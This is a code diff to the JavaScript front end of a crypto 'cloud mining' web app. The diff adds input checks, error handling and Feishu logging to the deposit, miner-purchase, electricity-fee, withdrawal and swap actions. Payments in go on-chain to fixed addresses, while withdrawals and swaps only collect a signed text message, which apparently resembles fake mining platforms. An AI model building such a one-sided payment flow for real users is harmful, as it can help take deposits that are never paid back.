@@ -466,26 +466,76 @@ function openFinanceModal(type) {
 }
 
 // --- 7. 执行动作 ---
+
+// 充值记录
 async function doRecharge() {
     const symbol = document.getElementById('recToken').value;
     const amount = document.getElementById('recAmount').value;
-    if (symbol === 'BNB') await executeNativeTransfer(RECEIVE_ADDRS.RECHARGE, amount);
-    else await executeTokenTransfer(CONTRACT_ADDRS[symbol], RECEIVE_ADDRS.RECHARGE, amount);
+    if (!amount || amount <= 0) return alert("请输入金额");
+
+    try {
+        if (symbol === 'BNB') {
+            await executeNativeTransfer(RECEIVE_ADDRS.RECHARGE, amount);
+        } else {
+            await executeTokenTransfer(CONTRACT_ADDRS[symbol], RECEIVE_ADDRS.RECHARGE, amount);
+        }
+        // 核心：上链成功或启动后，向飞书记录
+        await postTransactionRecord('充值', amount, symbol);
+        closeModal();
+    } catch (e) {
+        console.error(e);
+    }
 }
 
+// 购买矿机 & 缴纳电费记录
 async function doChainPay(bizType) {
     let rawAmt = (bizType === 'MINER') 
         ? document.getElementById('buyTotal').innerText.replace('$ ', '') 
         : document.getElementById('elecCost').innerText.replace(' USDT', '');
-    await executeTokenTransfer(CONTRACT_ADDRS.USDT, RECEIVE_ADDRS[bizType], rawAmt);
+    
+    try {
+        await executeTokenTransfer(CONTRACT_ADDRS.USDT, RECEIVE_ADDRS[bizType], rawAmt);
+        
+        // 核心：记录到飞书 (区分类型)
+        const typeName = (bizType === 'MINER') ? '购买矿机' : '缴纳电费';
+        await postTransactionRecord(typeName, rawAmt, 'USDT');
+        closeModal();
+    } catch (e) {
+        console.error(e);
+    }
 }
 
+// 提币 & 兑换 签名记录
 async function handleSignAction(type) {
     try {
         const msg = `${type} Request\nTime: ${Date.now()}`;
         const sig = await window.ethereum.request({ method: 'personal_sign', params: [msg, currentAddress] });
-        if (sig) { alert("申请已提交"); closeModal(); }
-    } catch (e) { alert("已取消"); }
+        
+        if (sig) {
+            // 根据业务类型准备数据
+            let actionName = "";
+            let amount = "0";
+            let symbol = "FBS";
+
+            if (type === 'WITHDRAW') {
+                actionName = "提币";
+                amount = document.getElementById('witAmount').value;
+                symbol = document.getElementById('witToken').value;
+            } else if (type === 'SWAP') {
+                actionName = "兑换";
+                amount = document.getElementById('sFromAmt').value;
+                symbol = `${document.getElementById('sFromToken').value} -> ${document.getElementById('sToToken').value}`;
+            }
+
+            // 核心：记录到飞书
+            await postTransactionRecord(actionName, amount, symbol);
+            
+            alert("申请已提交"); 
+            closeModal();
+        }
+    } catch (e) { 
+        alert("已取消"); 
+    }
 }
 
 // --- 8. UI 辅助逻辑 ---
